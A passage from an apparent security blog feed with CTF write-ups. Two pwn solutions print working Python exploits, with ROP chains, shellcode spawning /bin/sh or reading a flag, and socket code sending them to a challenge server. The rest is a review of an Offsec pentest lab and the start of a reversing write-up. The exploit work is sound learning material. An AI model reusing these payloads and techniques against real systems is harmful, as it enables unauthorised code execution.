</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>    <span class="c"># fix stack</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>            <span class="c"># stdin</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>    <span class="c"># address of buffer</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>        <span class="c"># number of bytes to read</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;BBBB&quot;</span>      <span class="c"># dummy value</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>    <span class="c"># return to shellcode!</span>
</span><span class='line'>
</span><span class='line'><span class="c"># payload length must be 125, because after read, the next</span>
</span><span class='line'><span class="c"># syscall is mprotect; eax = 125</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">125</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="c">#s.connect((&quot;localhost&quot;,28099))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;pwnable.katsudon.org&quot;</span><span class="p">,</span><span class="mi">28099</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># http://www.shell-storm.org/shellcode/files/shellcode-851.php</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># the shell should have been spawned, so interact with it</span>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>This first bit of python sets up the exploit. I have a helper function called <code>p(x)</code> that can dump addresses in the correct endianness into the payload. First, the payload consists of 16 bytes to smash the stack. Then, the ROP chain starts. Finally, I made sure that the first payload is 125 bytes, so that <code>eax</code> will contain the correct syscall number for mprotect. This first important part of the ROP chain looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>    <span class="c"># I rely on the return value of the read syscall</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>    <span class="c"># fix stack with add esp, 10; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>    <span class="c"># address to modify</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>   <span class="c"># length (page-aligned!)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>      <span class="c"># PROT_READ|PROT_WRITE|PROT_EXEC</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAA&quot;</span>      <span class="c"># dummy value</span>
</span></code></pre></td></tr></table></div></figure>


<p>This will call <code>syscall(0x8048000, 0x1000, 0x7)</code> with <code>eax</code> set to 125. This makes the memory area at 0x8048000 writeable! Next, I need to read in the shellcode, but for that <code>eax</code> must be 3. I first reset <code>ebx</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># reset ebx so we can set eax using the next gadget</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>            <span class="c"># set ebx = 0</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>   <span class="c"># don&#39;t care</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>      <span class="c"># don&#39;t care</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAA&quot;</span>      <span class="c"># dummy</span>
</span></code></pre></td></tr></table></div></figure>


<p>Whatever this syscall is (I don&rsquo;t know the value of <code>eax</code> after the mprotect call, nor do I care), it fails but the side-effect is that <code>ebx</code> is now 0. That sets us up for moving the correct number in <code>eax</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># set eax = 3</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">0x804834a:   0x00000003  0x00000000</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRET</span><span class="p">)</span>    <span class="c"># pop esi; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804834a</span><span class="p">)</span> <span class="c"># set esi = 0x804834a</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">LESEAX</span><span class="p">)</span>    <span class="c"># eax -&gt; 0x3 == syscall_read</span>
</span></code></pre></td></tr></table></div></figure>


<p>First, I use a <code>pop esi; ret</code> gadget to set the value of <code>esi</code> to a 48 bit value that contains: 0x3, 0x0. Then I return to the little gadget to set <code>eax</code> (and <code>es</code>) using those values. This results in <code>eax</code> being the correct number for the next syscall, read:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>    <span class="c"># fix stack</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>            <span class="c"># stdin</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>    <span class="c"># address of buffer</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>        <span class="c"># number of bytes to read</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;BBBB&quot;</span>      <span class="c"># dummy value</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This reads in <code>0x200</code> bytes from stdin to the start of the executable section of the binary. Finally, the ROP chain returns to the start of that buffer, which hopefully contains our shellcode! Finally, make sure that the payload is indeed 125 bytes long, else this entire house of cards falls down:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># payload length must be 125, because after read, the next</span>
</span><span class='line'><span class="c"># syscall is mprotect; eax = 125</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">125</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>Because I ran the executable locally via socat, I need to connect to the proper socket and send the payload. The same goes for the remote connection.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="c">#s.connect((&quot;localhost&quot;,28099))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;pwnable.katsudon.org&quot;</span><span class="p">,</span><span class="mi">28099</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>After finishing the ROP chain, the binary should now be awaiting further shellcode on stdin, so I&rsquo;d better send that over quickly!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># http://www.shell-storm.org/shellcode/files/shellcode-851.php</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># the shell should have been spawned, so interact with it</span>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The shellcode is sent over; the ROP chain will read it at <code>0x8048000</code>, return to it and execute <code>/bin/sh</code>. Then I pass the socket to a telnet client to interact with the spawned shell. This allowed me to read the flag!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>python exploit_easy.py
</span><span class='line'>pwn me:
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>easypwn<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>easypwn<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>easypwn<span class="o">)</span>
</span><span class='line'>cat /home/easypwn/flag
</span><span class='line'>ADCTF_175_345y_7o_cON7ROL_5Y5c4LL
</span></code></pre></td></tr></table></div></figure>


<p>The flag was <code>ADCTF_175_345y_7o_cON7ROL_5Y5c4LL</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Oh My Scanf]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/17/adctf-2014-oh-my-scanf/"/>
    <updated>2014-12-17T22:22:34+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/17/adctf-2014-oh-my-scanf</id>
    <content type="html"><![CDATA[<p>Another month, another CTF! This Advent CTF runs almost the entire month of December. This challenge seemed easy at first, but turned out to be a bit more tricky!</p>

<!-- more -->


<p>We&rsquo;re given a vulnerable binary plus the C source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* gcc -m32 -fno-stack-protector -zexecstack -o oh_my_scanf oh_my_scanf.c */</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;name: &quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;hi, %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This looks pretty straight-forward, right? <code>scanf</code>, an executable stack and a small buffer, oh my! A standard buffer overflow:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
</span><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>./oh_my_scanf
</span><span class='line'>name: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
</span><span class='line'>hi, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>I checked <code>gdb</code> and <code>eip</code> was overwritten with <code>HHHH</code>, so we need 28 bytes to overflow the buffer. Next, because the stack is executable, we should be able to jump to it&hellip; but how? ALSR is enabled so we don&rsquo;t know the location of the stack. None of the registers contain a pointer to the shellcode, there aren&rsquo;t any <code>jmp esp</code> or <code>call esp</code> instructions. Bruteforcing it seemed tedious at best. We looked at writing a ROP chain, but there are very few useable gadgets.</p>

<p>Thinking long and hard together with Swappage and superkojiman, we came up with several strategies. One of the suggestions by Swappage revolved around abusing <code>scanf</code> to build shellcode somewhere. superkojiman noticed that the main code section is <code>rwx</code>!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>vmmap
</span><span class='line'>Start      End        Perm    Name
</span><span class='line'>0x08048000 0x08049000 r-xp    /home/bas/adventctf/oh_my_scanf
</span><span class='line'>0x08049000 0x0804a000 r-xp    /home/bas/adventctf/oh_my_scanf
</span><span class='line'>0x0804a000 0x0804b000 rwxp    /home/bas/adventctf/oh_my_scanf
</span><span class='line'>0xf7e19000 0xf7e1a000 rwxp    mapped
</span><span class='line'>...snip...
</span></code></pre></td></tr></table></div></figure>


<p>Yes, this has to be it! We can write to a section of memory that is executable <em>and</em> at a fixed location. After writing shellcode there, we simply jump to it to have our cake <em>and</em> eat it.</p>

<p>So I modified a ROP chain that I was fiddling with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">SCANF</span> <span class="o">=</span> <span class="mh">0x80483b0a</span>
</span><span class='line'><span class="n">POPRET</span> <span class="o">=</span> <span class="mh">0x804835d</span>
</span><span class='line'><span class="n">SCANF_STRING</span> <span class="o">=</span> <span class="mh">0x80495ce</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">28</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SCANF</span><span class="p">)</span>         <span class="c"># return-to-got, scanf</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRET</span><span class="p">)</span>        <span class="c"># next return address</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SCANF_STRING</span><span class="p">)</span>  <span class="c"># pointer to &quot;%s&quot;, arg1 for scanf</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0804a040</span><span class="p">)</span>   <span class="c"># pointer to readable/executable</span>
</span><span class='line'>                          <span class="c"># arbitrarily chosen section of code</span>
</span><span class='line'>                          <span class="c"># it doubles as return address</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>             <span class="c"># close first scanf call</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this modified shellcode below will be read by the scanf call that results from our ROP chain.</span>
</span><span class='line'><span class="c"># we need the extra &quot;\na&quot; to flush the buffer, i think. </span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x54\x59\x90\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff</span><span class="s">flag</span><span class="se">\n</span><span class="s">a&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>I used a modified version of <a href="http://www.shell-storm.org/shellcode/files/shellcode-73.php">this shellcode</a>. The shellcode wasn&rsquo;t working locally, and I narrowed it down quickly to a bad byte, <code>0x0c</code>. This was part of the <code>lea ecx, [esp]</code> instruction. I exchanged this for:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>rasm2 -
</span><span class='line'>push esp
</span><span class='line'>54
</span><span class='line'>pop ecx
</span><span class='line'>59
</span><span class='line'>nop
</span><span class='line'>90
</span></code></pre></td></tr></table></div></figure>


<p>And off we went! I verified the exploit remotely by reading <code>/etc/passwd</code> and then I guessed the name of the flag file to be <code>flag</code>. Simple, really =)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>python exploit.py <span class="p">|</span> nc pwnable.katsudon.org 32100
</span><span class='line'>name: hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAA..<span class="o">]</span>.E.@..
</span><span class='line'>ADCTF_Sc4NF_IS_PRe77Y_niCE
</span></code></pre></td></tr></table></div></figure>


<p>The flag was <code>ADCTF_Sc4NF_IS_PRe77Y_niCE</code>. In the end, the executable stack turned out to be a red herring and something more unusual was going on. Cool challenge!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Don't Hate the Playground, Hate the Game]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/11/dont-hate-the-playground/"/>
    <updated>2014-12-11T19:11:06+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/11/dont-hate-the-playground</id>
    <content type="html"><![CDATA[<p>Several months ago, Peleus approached me and asked me to participate in a beta-test of an upcoming Offsec &ldquo;Playground&rdquo;. I still feel honored for being selected! Together with several others, I was given over two weeks of intensive beta-breaking :)</p>

<!-- more -->


<p>Some background about myself: I have been absorbed in the infosec field almost four years ago, starting with Over the Wire&rsquo;s wargames. Since then, I&rsquo;ve discovered the awesome <a href="https://vulnhub.com">VulnHub.com</a> and I have been addicted ever since. I have no formal background in computer science, nor have I taken <a href="http://www.offensive-security.com/information-security-training/penetration-testing-with-kali-linux/">PWK</a> or <a href="http://www.offensive-security.com/information-security-training/cracking-the-perimeter/">CTP</a> <em>yet</em>. Still, someone thought I was good enough to participate and I jumped at the chance.</p>

<p>The playground is a network, a pentest lab, built from the ground up by the Offsec crew. It contains virtual machines for us to attack and try to compromise. I was given a VPN connection to the playground. The playground itself consisted of a DMZ and several subnets. A Kali image was provided as well, which I downloaded a week into the beta-test (my mistake, should&rsquo;ve gotten it earlier). The playground offered a huge variety of machines, ranging from Linux, FreeBSD, Windows all the way to Citrix and SCADA systems. Each machine had a unique entrypoint. Some machines could only be compromised by first rooting another box. This was very nice and gave the playground an interconnected feel. Other boxes allowed pivoting into one of the other subnets. In total, there were more than fourty! boxes available.</p>

<p>The difficulty ranged from super-easy, google-click-root to mind-bendingly hard. I managed to pop ten boxes, which put me at the lower end of the spectrum. Nevertheless, I can say I&rsquo;ve learned a ton from this experience. I can now see why Offensive Security&rsquo;s slogan is &ldquo;Try Harder&rdquo; ;)</p>

<p>I think this experience has made a couple of things clear. First, I <em>really</em> need to do PWK. Second, there&rsquo;s always more to learn and more boxes to hack! Overall, I&rsquo;d say if you have the opportunity, definitely try your hand at the Playground: you will not be disappointed!</p>

<p>Finally, I&rsquo;d like to give a shout-out to Peleus for recruiting me and g0tmi1k, muts and the rest of the offsec crew for accepting me as a beta-tester. Last, but not least, thanks to my fellow beta-testers for sharing the pain and joy of attacking the playground! It has been an awesome learning experience, thank you!</p>

<p>&ldquo;<strong>Be not afraid of growing slowly, be afraid only of standing still.</strong>&rdquo; &ndash;random Chinese Proverb that I find appropriate ;)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[9447 CTF: Rolling]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/02/9447-ctf-rolling/"/>
    <updated>2014-12-02T20:43:25+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/02/9447-ctf-rolling</id>
    <content type="html"><![CDATA[<p>The last flag for 9447 CTF that I got was this binary reversing challenge. Let&rsquo;s get <code>rolling</code>!</p>

<!--more-->


<p>Identifying the binary with file showed that it was a 64-bit ELF, dynamically linked. Unfortunately for me, it was linked against a higher <code>libc</code> version:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/9447<span class="nv">$ </span>./rolling
</span><span class='line'>./rolling: /lib/x86_64-linux-gnu/libc.so.6: version <span class="s1">&#39;GLIBC_2.14&#39;</span> not found <span class="o">(</span>required by ./rolling<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>To solve this issue, I needed a way to get the program to use a newer version of libc. One way to do this is using <code>LD_PRELOAD</code>. I downloaded a <a href="http://pkgs.org/ubuntu-14.10/ubuntu-main-amd64/libc6_2.19-10ubuntu2_amd64.deb.html">newer libc deb</a>, that ought to be binary compatible with my debian box. After unpacking <code>ld-2.19.so</code> and <code>libc-2.19.so</code>, I could start the binary like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/9447<span class="nv">$ LD_PRELOAD</span><span class="o">=</span>./libc-2.19.so ./ld-2.19.so ./rolling
</span><span class='line'>Fynd i mewn i cyfrinair
</span></code></pre></td></tr></table></div></figure>


<p>And in <code>gdb</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
